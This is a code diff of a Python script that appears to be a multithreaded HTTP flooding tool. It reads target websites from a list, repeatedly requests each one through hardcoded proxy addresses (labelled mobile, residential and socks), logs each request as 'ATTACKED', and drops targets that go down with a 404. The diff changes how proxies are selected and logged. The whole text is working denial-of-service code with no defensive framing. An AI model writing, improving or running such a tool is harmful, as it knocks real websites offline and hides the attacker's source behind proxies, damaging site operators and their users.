@@ -83,22 +83,7 @@ def check_taget(target, proxy_str):
 
     return True
 
-
-def get_proxy(data, checker):
-    logger.info("CHECKING GIVEN PROXIES")
-
-    for proxy in data['proxy']:
-        auth = proxy["auth"]
-        ip = proxy["ip"]
-
-        out_proxy = (auth + "@" + ip + "/")
-        if check_proxie(checker, out_proxy):
-            return out_proxy
-    return None
-
-
-
-def mainth(protocol, ip):
+def mainth(protocol, ip, proxy_name):
     # Fetching data with proxy and targets
     with open('list.txt') as f:
         sites = f.read().splitlines()
@@ -133,7 +118,7 @@ def mainth(protocol, ip):
                 else:
                     response = scraper.get(current_target)
                 logger.info("ATTACKED; RESPONSE CODE: " +
-                            str(response.status_code) + " " + current_target)
+                            str(response.status_code) + " TARGET: " + current_target + " PROXY: " + proxy_name)
                 if response.status_code == 404:
                     sites.pop(index_)
                     break
@@ -151,9 +136,9 @@ def cleaner():
 
 if __name__ == '__main__':
     proxies = [
-        ('http://', 'http://193.23.50.206:11335',),
-        ('https://', 'http://193.23.50.164:10215',),
-        ('https://', 'socks5://193.23.50.164:10216',)
+        ('http://', 'http://193.23.50.206:11335', 'mobile', ),
+        ('https://', 'http://193.23.50.164:10215', 'residental', ),
+        ('https://', 'socks5://193.23.50.164:10216', 'socks', )
     ]
     for _ in range(threads):
         Thread(target=mainth, args=choice(proxies)).start()
